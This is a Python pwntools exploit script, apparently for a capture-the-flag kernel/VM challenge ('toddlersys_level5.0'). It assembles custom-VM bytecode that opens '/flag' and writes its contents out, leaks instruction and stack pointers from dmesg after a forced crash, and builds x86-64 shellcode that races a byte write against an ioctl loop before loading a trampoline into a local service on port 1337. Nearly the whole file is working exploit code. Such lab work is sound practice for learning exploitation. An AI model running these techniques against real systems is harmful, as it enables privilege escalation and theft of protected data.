#尽力长时间的挣扎，终于承认自己想不出来了
def getarg(arg):
    if arg[0:2] == "0x":
        return int(arg, 16).to_bytes(1, "little")
    if arg[0] == "*":
        arg=arg[1:]
    ireg = 1
    reg="ibacdfs"
    if reg.find(arg) != -1:
        ireg = ireg << reg.find(arg)
        return ireg.to_bytes(1, "little")
    elif arg == "open":
        return b"\x01"
    elif arg == "read_memory":
        return b"\x10"
    elif arg == "write":
        return b"\x04"
    return None
def assembly(ass):
    if ass == "":
        return b""
    bc = bytearray()
    ass = ass.split(" ")
    if(ass[0] == "IMM"):
        op = b"\x10"
    elif(ass[0] == "ADD"):
        op = b"\x40"
    elif(ass[0] == "STK"):
        op = b"\x80"
    elif(ass[0] == "STM"):
        op = b"\x08"
    elif(ass[0] == "LDM"):
        op = b"\x04"
    elif(ass[0] == "CMP"):
        op = b"\x01"
    elif(ass[0] == "JMP"):
        op = b"\x02"
    elif(ass[0] == "SYS"):
        op = b"\x20"
    
    for i in ass:
        c = getarg(i)
        if c != None:
            bc = bc + bytearray(c)

    bc.insert(0, op[0])
    return bc

c = bytearray()
yangasm = '''
IMM d = 0x2f
IMM c = 0x80
STM *c = d

IMM d = 0x66
IMM c = 0x81
STM *c = d

IMM d = 0x6c
IMM c = 0x82
STM *c = d

IMM d = 0x61
IMM c = 0x83
STM *c = d

IMM d = 0x67
IMM c = 0x84
STM *c = d

IMM d = 0x0
IMM c = 0x85
STM *c = d

IMM a = 0x80
IMM b = 0x40
IMM c = 0xff
SYS open a

IMM b = 0x00
IMM c = 0xff
SYS read_memory a

IMM b = 0x39
CMP a b



IMM d = 0x2f
IMM c = 0x80
STM *c = d

IMM d = 0x68
IMM c = 0x81
STM *c = d

IMM d = 0x6f
IMM c = 0x82
STM *c = d

IMM d = 0x6d
IMM c = 0x83
STM *c = d

IMM d = 0x65
IMM c = 0x84
STM *c = d

IMM d = 0x2f
IMM c = 0x85
STM *c = d

IMM d = 0x68
IMM c = 0x86
STM *c = d

IMM d = 0x61
IMM c = 0x87
STM *c = d

IMM d = 0x63
IMM c = 0x88
STM *c = d

IMM d = 0x6b
IMM c = 0x89
STM *c = d

IMM d = 0x65
IMM c = 0x8a
STM *c = d

IMM d = 0x72
IMM c = 0x8b
STM *c = d

IMM d = 0x2f
IMM c = 0x8c
STM *c = d

IMM d = 0x62
IMM c = 0x8d
STM *c = d

IMM d = 0x0
IMM c = 0x8e
STM *c = d

IMM a = 0x80
IMM b = 0x02
IMM c = 0x00
SYS open a

IMM b = 0x00
IMM c = 0xff
SYS write a
'''

yangasm = yangasm.split("\n")
for i in yangasm:
    c += assembly(i)

from pwn import *
BINARY = "/challenge/toddlersys_level5.0"
# display the bytes
# print(disasm(my_sc))
context.arch="amd64"
context.os = "linux"

# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug("/challenge/toddlersys_level2.0", gdbscript="source /opt/gef/gef.py")
def load_program(n:connect, i:int, c:bytearray):
    n.sendline(b"load_program")
    n.sendline(str(i).encode())
    n.send(c)
def init_ypu(n:connect, i:int, j:int):
    n.sendline(b"init_ypu")
    n.sendline(str(i).encode())
    n.sendline(str(j).encode())
def run_ypu(n:connect, i:int):
    n.sendline(b"run_ypu")
    n.sendline(str(i).encode())
def quit(n:connect):
    n.sendline(b"quit")


nc = connect("127.0.0.1", 1337)

crash_program = 15
crashing_yancode = b'A' * 0x1000
load_program(nc, crash_program, crashing_yancode)
quit(nc)

dmesg = process('dmesg | grep traps | tail -n 1', shell=True)
dmesg.recvuntil(b'ip:')
ip_leak = int(dmesg.recvuntil(b' '), 16)
dmesg.recvuntil(b'sp:')
sp_leak = int(dmesg.recvuntil(b' '), 16)
dmesg.kill()
print("ip_leak: "+hex(ip_leak) + "\nsp_leak: " + hex(sp_leak))

base_addr = ip_leak - 0x172F
SHELLCODE = '''
read_mmap:
mov rbx, {0}
mov rcx, [rbx]
mov [rip + saved_mmap_addr], rcx

do_clone:
mov r9, QWORD PTR fs:0x10
xor r8, r8
lea r10, [r9 + 0x2d0]
xor rdx, rdx
xor rsi, rsi
mov rdi, 0x1200011
mov rax, 56
syscall
cmp rax, 0
jne parent

child:
mov rbx, [rip + saved_mmap_addr]
add rbx, 72
mov cl, {1}
mov dl, {2}

race_loop:
mov byte ptr [rbx], cl
mov byte ptr [rbx], dl
jmp race_loop

parent:

ioctl_loop:
mov rdi, 4
mov rsi, 1337
mov rax, 16
syscall
jmp ioctl_loop

saved_mmap_addr:
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
'''

nc = remote('localhost', 1337)

load_program(nc, 0, c)
init_ypu(nc, 0, 0)
run_ypu(nc, 0)


binary = ELF(BINARY)
binary.address = base_addr
ypu_0_mmap_addr = binary.symbols['data'] + 8
log.info(f'ypu_0_mmap_addr: {hex(ypu_0_mmap_addr)}')

shellcode_program = 0
shellcode = b'\x90' * 0x100
shellcode += asm(SHELLCODE.format(ypu_0_mmap_addr, 0x01, 0x20))
shellcode += b'\x90' * (0x1000 - len(shellcode))
load_program(nc, shellcode_program, shellcode)

shellcode_addr = sp_leak - 0x3008
trampoline_program = 15
trampoline = p64(shellcode_addr)
trampoline *= int(0x1000 / 8)
load_program(nc, trampoline_program, trampoline)
quit(nc)